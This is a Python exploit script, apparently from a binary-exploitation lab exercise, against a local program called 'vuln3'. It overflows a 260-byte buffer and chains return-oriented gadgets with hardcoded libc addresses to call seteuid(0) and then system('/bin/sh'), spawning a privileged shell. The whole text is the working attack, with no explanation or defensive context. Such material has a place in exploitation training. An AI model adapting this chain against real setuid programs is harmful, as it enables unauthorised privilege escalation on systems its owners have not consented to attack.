#!/usr/bin/evn python

import struct
import subprocess

seteuid_addr	= 0xb7ee28b0 # seteuid fxn address
system_addr	= 0xb7e3f850 # system fxn address
exit_addr	= 0xb7e336c0 # exit fxn address
bin_sh_str	= 0xb7f5de64 # "/bin/sh" string
pop_ret		= 0xb7f46859 # pop; ret;
xor_eax_eax	= 0xb7e34a3b # make eax null
mov_esp_8_eax	= 0xb7e2ffd5 # mov null bytes to esp + 0x8 location

buf = "A" * 260				# Garbage
buf += struct.pack("<I", xor_eax_eax)	# xor eax eax; ret;
buf += struct.pack("<I", mov_esp_8_eax)	# mov (esp)0x8 eax; ret;
buf += struct.pack("<I", seteuid_addr)	# call seteuid fxn
buf += struct.pack("<I", pop_ret)	# pop; ret; (pop setuid fxn arg)
buf += struct.pack("<I", 0xffffffff)	# setuid arg placeholder.Replaced by null
buf += struct.pack("<I", system_addr)	# call system fxn
buf += struct.pack("<I", exit_addr)	# call exit fxn
buf += struct.pack("<I", bin_sh_str)	# system fxn arg

#print buf

subprocess.call(["./vuln3", buf]) # pwn3d! ;)
